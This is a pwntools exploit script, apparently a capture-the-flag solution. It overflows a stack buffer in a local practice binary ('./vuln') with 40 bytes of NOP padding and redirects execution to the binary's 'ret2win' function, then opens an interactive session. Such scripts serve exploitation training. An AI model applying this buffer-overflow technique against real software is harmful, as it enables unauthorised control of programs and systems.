from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

padding = 40 # How many bytes to EIP?

payload = flat(
    asm('nop') * padding,  # Padding to EIP
    elf.symbols['ret2win'],  # win_function - 0x804862c
)

# Save the payload
f = open("payload", "wb")
f.write(payload)

# PWN
io.sendlineafter('>', payload)
io.interactive()
